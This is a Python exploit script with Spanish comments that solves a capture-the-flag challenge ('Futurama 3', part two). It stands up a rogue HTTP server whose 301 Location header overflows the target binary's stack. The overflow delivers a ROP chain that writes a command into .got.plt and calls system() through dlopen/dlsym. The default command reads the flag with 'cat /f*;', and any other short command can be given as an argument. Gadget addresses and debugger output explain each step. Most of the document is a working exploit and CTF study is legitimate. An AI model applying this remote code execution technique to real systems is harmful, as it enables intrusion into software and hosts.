# exploit.py
# Exploit para resolver la segunda parte del reto "Futurama 3".
# Este exploit es una PoC para lograr la flag directamente sobre el servidor web
# en una sola ejecucion y sin LEAKS.
# by @disbauxes (a.k.a @socialk@s)
#
# Comentarios sin acentos.
#
# Parcialmente inspirado por el reto Twicat de @c0rn0n4con, quise sacar la flag en el textarea
# del servidor web con una sola ejecucion, sin recurrir al leak del x-debug.
#
# Modo de empleo:
#
#   python exploit-writeup.py
#   En el servidor UAM, escribir http://<LHOST>:<LPORT> y pulsar "carl".
#   La flag aparecera en el servidor web.
#
#   Write-up (upcoming ;-):
#   http://disbauxes.upc.es/code/uam-futurama-3-parte-2-partial-writeup-rop-contra-servidor-web-sin-leaks/

from pwn import * 
import sys
import socket
import signal
import time 

# IP y puerto donde lanzaremos este script. El servidor web de la UAM debe tener
# acceso a este equipo:
LHOST = "0.0.0.0"
LPORT = 6666

#######################################################################################
# Servidor HTTP implementado con sockets que procesa el Request de carl y envia
# las cabeceras con el exploit.
#######################################################################################
class Server:
 def __init__(self, port):
     self.host = LHOST
     self.port = port
     self.www_dir = '/'
 def activate_server(self):
     self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         print ("Launching HTTP server on ", self.host, ":",self.port)
         self.socket.bind((self.host, self.port))
     except Exception as e:
         print ("Warning: Could not aquite port:",self.port,"\n")
         self.shutdown()
         sys.exit(-1)
     print ("Server successfully acquired the socket with port:", self.port)
     self._wait_for_connections()

 def shutdown(self):
     try:
         print("Shutting down the server")
         s.socket.shutdown(socket.SHUT_RDWR)
     except Exception as e:
         print("Warning: could not shut down the socket. Maybe it was already closed?",e)

 def _gen_headers(self):
     # Acceso al payload generado:
     global payload

     # Forzamos el 301 para llegar a la vulnerabilidad:
     h = 'HTTP/1.1 301 Launching exploit\n'

     current_date = time.strftime("%a, %d %b %Y %H:%M:%S", time.localtime())
     h += 'Date: ' + current_date +'\n'
     h += 'Server: la_flag_is_mine\n'
     h += 'Connection: close\n'

     h += "x-debug: \n"
     # Lanzamos el payload dentro de la header "location", provocando el BOF:
     h += "location:" + "http://0:6666/" + payload +  "\n\n" 

     return h

 def _wait_for_connections(self):
     while True:
         try:
             print ("Awaiting New connection")
             self.socket.listen(1) # maximum number of queued connections

             conn, addr = self.socket.accept()

             print("Got connection from:", addr)

             data = conn.recv(1024) #receive data from client
             string = bytes.decode(data) #decode it to string

             #determine request method  (HEAD and GET are supported)
             request_method = string.split(' ')[0]
             print ("Method: ", request_method)
             print ("Request body: ", string)

             if (request_method == 'GET') | (request_method == 'HEAD'):
                # Generamos la respuesta a devolver: headers + body en blanco:
                response_content = ""
                response_headers = self._gen_headers()
                server_response =  response_headers
                if (request_method == 'GET'):
                    server_response +=  response_content  # return additional conten for GET only
                # Devolvemos la respuesta al servidor UAM:
                conn.send(server_response)
                conn.close()
                # Ya podemos cerrar el servidor web:
                self.shutdown()
             else:
                 print("Unknown HTTP request method:", request_method)
         except Exception as e:
             sys.exit(0)

def graceful_shutdown(sig, dummy):
    s.shutdown() #shut down the server

# Aqui tendremos el payload generado:
payload = ''

# Comando a ejecutar (limitado a 7 chars + ";"):
# Para la flag, basta con cat /fl*;:
# El caracter ";" es imprescindible para que system ejecute el primer comando
# correctamente, aunque de error en la morralla que viene luego:
cmd =   "cat /f*;"

# Valor para el RBP:
EBP = 0xcafebabe

# Cuando pulsemos CTRL+c, se ejecutara la funcion graceful_shutdown:
signal.signal(signal.SIGINT, graceful_shutdown)

#######################################################################################
# Encodeamos los \x00 como %00
#######################################################################################
def p64url(address):
    addr = p64(address)
    addrhttp = ''
    for b in addr:
        if ord(b) == 0:
            addrhttp += '%00'
        else:
            addrhttp += b
    return addrhttp

# Podemos indicar el comando a ejecutar mediante argumento. Esta PoC tiene ciertas
# restricciones. Por defecto se leera la flag con cat /fl*; :
if len(sys.argv)==2:
    if len(sys.argv[1]) < 8:
        cmd = sys.argv[1] + ";" + " "*(7-len(sys.argv[1]))
    else:
        print "El comando puede tener maximo 7 chars."
        print "Ejemplo para sacar la flag: " + cmd
        sys.exit(0)

context(arch='amd64', os='linux')

#   Para lograr el BOF, despues de reversear carl.bin, llegamos a este vector:
#   1.- Servidor web retorna respuesta 301 o 302.
#   2.- Envia el header "x-debug"   (LEAK).
#   3.- Envia el header "location" con una URI http://0:1731/ + padding + payload.
#   4.- El servidor de location debe ser resolvible (por ejemplo: http://0:<puerto>) o carl fallara.

# ROPS obtenidos con rr2 (/Rq).
# Algunos gadgets son legitimos y estan dentro
# del propio binario con la alineacion que toca:
_pop_rdi_ret        =   0x00402903
_str_libc_so_6      =   0x00402942
_str_system         =   0x0040294c
_dlopen             =   0x00400e30
_dlsym              =   0x00400ef0
_pop_rsi_r15_ret    =   0x00402901
_xchg_rax_rdi       =   0x004015b1
_mov_rbp_rsp_rdi_rsi=   0x004015a6
_call_rax_exit_0    =   0x00401112
_strncpy            =   0x00401c0f

# Direccion en un segmento rw- donde escribiremos nuestro comando.
# Hasta 8 bytess (7 comando + ";") para no sobreescribir la siguiente
# direccion y evitar el SEGFAULT:
# Esta direccion es la .got.plt (ver + adelante):
_address_cmd    =   0x00604000

# Valor necesario en nuestro prepend para acabar dejando _address_cmd en RAX y RDI:
_rbp_0xc0       =   0x00603ec8

# prepend. Estos son los bytes usualmente destinados al "padding" para llegar
# a desbordar el stack. En mi exploit, parte de dicho "padding" sera usado
# para sobreescribir una direccion rw con el comando "cmd".
prepend =   "A"*7
prepend +=  p64url(_rbp_0xc0)               # rax = [rbp-0xc0]
prepend +=  "B"*8
prepend +=  cmd                             # Comando sobre rw- 0x604000
prepend +=  "C"*128
prepend +=  p64url(len(cmd))                # rdx = [rbp - 0x28]
prepend +=  "D"*8
prepend +=  p64url(EBP)                     # RBP inicializado a valor absurdo

# El ROP chain empieza aqui:
payload += prepend

# Con los dos primeros gadgets de nuestro ataque logramos alinear nuestro prepend.
# Con esto alineamos RBP con el stack (lo habiamos sobreescrito para llegar a EIP):
# Lanzamos este ROP gadget 2 veces para alinearnos con los valores del stack que nos
# interesa (probablemente habra otros alineamientos validos) para lograr poner los valores
# de direccion sobre RAX y longitud del comando sobre RDX en el siguiente gadget (ojito,
# que es codigo legitimo del binario ;-)):
#   0x00401c0f      488b8540ffff.  mov rax, qword [dest]
#   0x00401c16      488b4030       mov rax, qword [rax + 0x30]
#   0x00401c1a      488b55d8       mov rdx, qword [size]       ; size_t  n
#   0x00401c1e      488d8d50ffff.  lea rcx, [var_b0h]
#   0x00401c25      4889ce         mov rsi, rcx                ; const char *src
#   0x00401c28      4889c7         mov rdi, rax                ; char *dest
#   0x00401c2b      e8c0f0ffff     call sym.imp.strncpy        ; char *strncpy(char *dest, const char *src, size_t  n)
#   0x00401c30      b800000000     mov eax, 0
#   0x00401c35      c9             leave
#   0x00401c36      c3             ret
#
#   Con gdb buscamos primero posibles direcciones del binario donde encontrar valores
#   que apunten a alguna seccion con permisos rw-. No podemos usar 0x604150 (seria lo
#   ideal) porque en el codigo se lee un QWORD. Asi que buscamos valores como:
#    0x0000000000604000 ... etc:
#
#   vmmap
#       0x0000000000604000 0x0000000000605000 0x0000000000004000 rw-
#
#   search-pattern 0x0000000000604000
#       0x603ef8 - 0x603ef8   -> ""
#
#   Lo que cae sobre RAX , tras sumarle 0x30, nos devolvera la direccion de memoria
#   valida dentro del binario que contendra el valor numerico 0x604000 (0x603ef8).
#   Esta direccion es la .got.plt y  tiene permisos de rw-. Esto es asi debido a que
#   el binario no implementa Full RELRO:
#
#   checksec 
#       RelRO                         : Partial
#
#   xinfo 0x604000
#   Page: 0x0000000000604000 ->  0x0000000000605000 (size=0x1000)
#   Permissions: rw-
#   Segment: .got.plt (0x0000000000604000-0x0000000000604140)
#
#   Por eso si sobreescribimos ahi, nuestro comando solo puede tener 8 chars para no
#   sobreescribir los siguientes 8 bytes de la .got.plt (que provocaria un SEGFAULT)
#
#x/8xg 0x0000000000604000
#0x604000:	0x0000000000603e10	0x00007ffff7ffe190
#0x604010:	0x00007ffff7fea500	0x0000000000400cc6
#0x604020 <recv@got.plt>:	0x0000000000400cd6	0x0000000000400ce6
#0x604030 <strncpy@got.plt>:	0x0000000000400cf6	0x0000000000400d06
#
#   Asi:
#       mov rax, qword [dest] con dest = [rbp - 0xc0 ] = 0x603ec8.
#       mov rax, qword [rax + 0x30]    = mov rax, [0x603ec8 + 0x30 ] => rax = 0x604000.
#       El valor 0x603ec8 esta en nuestro prepend.
#
#       Finalmente, el parametro size caera sobre rdx:
#       mov rdx, qword [size] con size = [ rbp - 0x28 ]
#       
#
payload += p64url(_mov_rbp_rsp_rdi_rsi)
payload += p64url(_mov_rbp_rsp_rdi_rsi)

# Ahora ejecutamos el codigo descrito arriba (codigo legitimo del binario), para acabar
# ejecutando un strncpy(0x604000,&cmd,len(cmd)):
payload += p64url(_strncpy)

# La parte complicada ya esta; ahora usaremos dlopen + dlsym para ejecutar el comando
# que hemos escrito sobre 0x00604000:

# dlopen():
# Podemos hacer dlopen() con un valor incorrecto en flags;
# igualmente abre el handle de dlopen!
# rax = dlopen(libc.so.6,lo_que_sea_en_rsi)
payload +=  p64url(_pop_rdi_ret)
payload +=  p64url(_str_libc_so_6)
payload +=  p64url(_dlopen)

# dlsym():
# rax = dlsym(handle,"system")
payload +=  p64url(_pop_rsi_r15_ret)    # rsi = "system"
payload +=  p64url(_str_system)
payload +=  p64url(0xdeadbeef)
payload +=  p64url(_xchg_rax_rdi)       # rdi = rax (rax held handle)
payload +=  p64url(_dlsym)

# system(0x00604000) llamando luego a exit(0). De este modo, carl no acaba con
# segfault. Esto es muy importante: si acaba con segfault, aunque ejecute el
# comando, el servidor web no nos lo mostrara, indicando "Internal Server Error":
payload += p64url(_pop_rdi_ret)
payload += p64url(_address_cmd)
payload += p64url(_call_rax_exit_0)         # rax tiene la direccion de system.

print "[+] Longitud del prepend + payload = " + str(len(payload)) + " bytes."
print "[+] Comando a ejecutar: " + cmd
print "[+] Payload:"
print payload

# Levantamos el servidor web y esperamos la conexion desde carl:
s = Server(LPORT)
s.activate_server()

# La flag la tendremos en el panel web del propio servidor de la UAM en 
# una sola pasada y sin leaks ;-)
sys.exit(0)
